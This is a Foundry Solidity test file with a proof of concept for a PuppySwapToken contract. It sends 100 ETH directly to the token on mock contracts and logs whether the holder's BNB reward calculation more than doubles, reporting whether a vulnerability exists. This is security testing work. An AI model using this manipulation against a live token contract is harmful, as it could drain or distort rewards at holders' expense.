// SPDX-License-Identifier: MIT
pragma solidity 0.6.8;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/PuppySwapToken.sol";

contract MockFactory {
    function createPair(address, address) external returns (address) {
        return address(0x0123456789012345678901234567890123456789);
    }
}

contract MockRouter {
    address public factory;
    address public weth;
    
    constructor(address _factory) public {
        factory = _factory;
        weth = address(0x456);
    }
    
    function WETH() external pure returns (address) {
        return address(0x456);
    }
}

contract TokenLeverageTest is Test {
    PuppySwapToken token;
    MockFactory mockFactory;
    MockRouter mockRouter;
    
    address holder = address(0x100);
    uint256 constant HOLDER_TOKENS = 1_000_000 * 10**18;
    
    function setUp() public {
        mockFactory = new MockFactory();
        mockRouter = new MockRouter(address(mockFactory));
        token = new PuppySwapToken(payable(address(mockRouter)));
        
        // Set max TX to 100% to avoid transfer limits
        token.setMaxTxPercent(10000);
        
        // Transfer tokens to test holder
        token.transfer(holder, HOLDER_TOKENS);
    }
    
    function testRewardCalculationManipulation() public payable {
        // Set initial balance of 1 ETH in token contract
        vm.deal(address(token), 1 ether);
        // Ensure test contract has necessary funds
        vm.deal(address(this), 100 ether);
        
        console.log("--- BEFORE-Trigger State ---");
        uint256 initialReward = token.calculateBNBReward(holder);
        console.log("Initial BNB reward:", initialReward);
        console.log("Token contract BNB balance before:", address(token).balance);
        
        console.log("--- Trigger: Execute ETH Inflation ---");
        (bool success, ) = payable(address(token)).call{value: 100 ether}("");
        require(success, "BNB transfer failed");
        
        console.log("--- AFTER-Trigger State ---");
        uint256 inflatedReward = token.calculateBNBReward(holder);
        console.log("Inflated BNB reward:", inflatedReward);
        console.log("Token contract BNB balance after:", address(token).balance);
        
        console.log("--- Comparison Result ---");
        bool rewardDoubled = inflatedReward > initialReward * 2;
        console.log("Is inflated reward > 2x initial reward?:", rewardDoubled ? "Yes" : "No");

        rewardDoubled ?
            console.log("Vulnerability Exists: Reward calculation manipulated via BNB inflation") :
            console.log("Vulnerability not Exist: Reward calculation unaffected");
    }
    
    // Required to receive ETH in tests
    receive() external payable {}
}